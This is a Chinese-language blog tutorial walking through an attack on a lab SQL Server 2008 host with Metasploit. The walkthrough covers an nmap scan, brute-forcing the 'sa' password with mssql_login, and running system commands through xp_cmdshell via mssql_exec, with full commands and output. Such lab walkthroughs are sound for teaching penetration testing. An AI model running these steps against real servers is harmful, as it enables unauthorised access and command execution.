layout: MSF应用之 sql sever（xp_cmdshell sp）
title: MSF应用之 sql sever（xp_cmdshell sp）
date: 2016-12-13 20:30:54
tags: Metasploit
categories: Metasploit 
---
 <span style="font-size: 200%;"> MSF应用之 sql sever（xp_cmdshell sp）</span><span style="font-size: 200%;">
 ![enter description here][1]
<!--more--> 
目标实验机：  虚拟机系统(windows server 2008  R2)

sql server 2008

本机工具：本机系统  mac  os

nmap/metaspliost
<h1><span style="color: #ff0000;">知识科普：</span></h1>
<strong><span style="color: #008000;">xp_cmdshell:</span></strong>
1. SQL中运行系统命令行的系统存储过程，一般在安全级别较高的服务器上，建议关闭或限制访问权,可以使用外围应用配置器工具以及通过执行 sp_configure 来启用和禁用 xp_cmdshell       (<span style="color: #008000;">在sql sever 2005以上 微软是自动关闭该选项，在sql server 2005版本中是自动开启的，虽然关闭着的，但是我们还是可以绕过该机制，在试验机中 ，关闭了该选项，但还是可以绕过，主要是因为服务器上关了自带的防火墙，才可以运行的该漏洞，各位小伙伴们可以在实验机上试试。虽然可以执行任意的dos命令，但是权限比较低)</span>

&nbsp;

2. 有许多方法来破解数据库，而且这些技术需要SQL注入（C），这是一种方式发送SQL命令从一个Web窗体或其他输入到数据库中。在本教程中，我们将使用SQL注入获取底层服务器。因此，我们将使用数据库作为访问底层服务器的中介来访问数据库和数据，而不是访问数据库和数据。

几乎所有的商业数据库MS SQL Server，Oracle，MySQL，DB2，等等，都有内置的系统存储过程（SP）。这是由开发人员提供的代码，以帮助系统管理员完成常见的任务。

通常，一个数据库系统管理员将需要访问底层的服务器，微软提供了一个称为xp_cmdshell SP在SQL Server。当系统管理员执行此命令时，他们会在托管数据库的基础服务器上获得一个命令提示。
这是一次对所有SP的微软SQL服务器安装的默认启用，但因为它是由黑客经常利用，微软已经禁用了默认但我们仍然可以访问它肆虐！
当然，要访问此远程登录，我们将需要系统管理员的登录凭据。默认情况下，微软包装他们的SQL Server与系统管理员帐户名为“SA”和一些系统管理员改变它。你可以使用这样的工具sqldict或Metasploit的辅助模块，sql_login，获得SA密码用在本hack。
如果我们能在受害者系统上执行命令，我们不能只运行侦察它，但我们也可以有足够的系统和Windows命令它自己的知识。
 <h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink" ></a></h1><hr>

<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/sqlserver.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
 
<h1><span style="color: #ff0000;"><strong>信息收集：</strong></span></h1>
<strong>nmap :</strong>
<pre class="lang:vim decode:true ">nmap -p 1433 192.168.1.0/24</pre>
<span style="color: #008000;">用nmap来针对：1433端口来扫描整个网段下的ip  检测是否开放了 1433端口</span>

检测结果如下：
<p style="padding-left: 60px;">Starting Nmap 7.12 ( https://nmap.org ) at 2016-11-27 21:16 CST
Nmap scan report for 192.168.1.1
Host is up (0.0080s latency).
PORT STATE SERVICE
1433/tcp filtered ms-sql-s</p>
<p style="padding-left: 60px;">Nmap scan report for 192.168.1.101
Host is up (0.00077s latency).
PORT STATE SERVICE
1433/tcp closed ms-sql-s</p>
<p style="padding-left: 60px;">Nmap scan report for 192.168.1.103
Host is up (0.00097s latency).
PORT STATE SERVICE
<span style="color: #ff0000;">1433/tcp open ms-sql-s</span></p>
&nbsp;

我们还可以对检测出开放1433端口的机子进行进一步的检测：
<pre class="lang:vim decode:true ">nmap -A 192.168.1.103</pre>
对该ip 进行全面检测，结果如下：
<p style="padding-left: 60px;">Nmap scan report for 192.168.1.103
Host is up (0.0021s latency).
Not shown: 989 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows 98 netbios-ssn
445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 microsoft-ds
<span style="color: #ff0000;">1433</span>/tcp<span style="color: #ff0000;"> open</span> ms-sql-s<span style="color: #ff0000;"> Microsoft SQL Server 2008 R2</span> 10.50.4000.00; SP2
| ms-sql-ntlm-info:</p>
<p style="padding-left: 60px;">49152/tcp open msrpc Microsoft Windows RPC
49153/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
49155/tcp open msrpc Microsoft Windows RPC
49156/tcp open msrpc Microsoft Windows RPC
49157/tcp open msrpc Microsoft Windows RPC
Service Info: OSs: Windows, Windows 98, <span style="color: #ff0000;">Windows Server 2008 R2</span>; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_server_2008:r2</p>
<p style="padding-left: 60px;">Host script results:
| ms-sql-info:
| <span style="color: #ff0000;">192.168.1.103:1433:</span>
| Version:
| name: <span style="color: #ff0000;">Microsoft SQL Server 2008 R2 SP2</span>
| Post-SP patches applied: false
| Product: <span style="color: #ff0000;">Microsoft SQL Server 2008 R2</span>
| number: 10.50.4000.00
| Service pack level: <span style="color: #ff0000;">SP2</span>
|_ TCP port: <span style="color: #ff0000;">1433</span></p>
<strong>具体详细使用nmap 参考（凌舞）</strong>

<a href="http://www.secist.com/archives/2197.html"> 原理篇：常用的扫描技术（一）</a>

<a href="http://www.secist.com/archives/2259.html">原理篇：常用的扫描技术（二）</a>

&nbsp;

那么我们知道目标机器使用的是sql server  2008的版本 而且还开放了1433端口

那么我们可以使用msf的辅助扫描模块，对其sqlserver的爆破，

msf 调用 scanner 模块
<pre class="lang:vim decode:true">msf &gt; use auxiliary/scanner/mssql/mssql_login
</pre>
设置挂载需要爆破的弱口令密码字典
<pre class="lang:vim decode:true">msf auxiliary(mssql_login) &gt; set PASS_FILE 1.txt
PASS_FILE =&gt; 1.txt</pre>
我们知道在mssql里面 sa的权限是最高的，在这里我们尝试着用sa来登录 ，里面也可以对其使用username_File 挂载mssql登录用户
<pre class="lang:vim decode:true">msf auxiliary(mssql_login) &gt; set username sa
username =&gt; sa</pre>
可自定义设置扫描线程：
<pre class="lang:vim decode:true ">msf auxiliary(mssql_login) &gt; set threads 50
threads =&gt; 50</pre>
设置目标ip
<pre class="lang:vim decode:true ">msf auxiliary(mssql_login) &gt; set rhosts 192.168.1.103
rhosts =&gt; 192.168.1.103</pre>
开始爆破
<pre class="lang:vim decode:true ">msf auxiliary(mssql_login) &gt; run

[*] 192.168.1.103:1433    - 192.168.1.103:1433 - MSSQL - Starting authentication scanner.
[-] 192.168.1.103:1433    - 192.168.1.103:1433 - LOGIN FAILED: WORKSTATION\sa:1111 (Incorrect: )
[+] 192.168.1.103:1433    - 192.168.1.103:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:111
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed</pre>
得知信息：

由以上收集到的信息为:

系统版本    <span style="color: #ff0000;">windows server  2008 r2</span>

数据库使用版本： <span style="color: #ff0000;">sql server  2008</span>

目标所在ip  以及开放的端口等信息： <span style="color: #ff0000;">192.168.1.103：1433 ms-sql-s</span>

mssql账号和密码为：sa /111

&nbsp;

&nbsp;
<h1><span style="color: #ff0000;">信息利用：</span></h1>
使用msf命令执行模块，执行最终的dos命令
<pre class="lang:default decode:true ">msf auxiliary(mssql_login) &gt; use auxiliary/admin/mssql/mssql_exec</pre>
使用options，来查看设置参数<img class="size-full wp-image-2293 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/A318BFAC-755A-479F-94C9-7A7D132DB807.png" alt="a318bfac-755a-479f-94c9-7a7d132db807" width="880" height="375" />

需要设置的是cmd里面的dos 命令 比如说：net user  查看用户组
<pre class="lang:vim decode:true">msf auxiliary(mssql_exec) &gt; set cmd 'net user'
cmd =&gt; net user
msf auxiliary(mssql_exec) &gt; set PASSWORD 111     (设置爆破出来的密码)
PASSWORD =&gt; 111
msf auxiliary(mssql_exec) &gt; set rhost 192.168.1.103  （设置目标ip）
rhost =&gt; 192.168.1.103
msf auxiliary(mssql_exec) &gt; exploit   （执行攻击
</pre>
&nbsp;

<img class="size-full wp-image-2292 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/5A09A414-11D6-4050-AF97-0E089062684B.png" alt="5a09a414-11d6-4050-af97-0e089062684b" width="881" height="472" />

&nbsp;


 


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz.1280x600.jpg 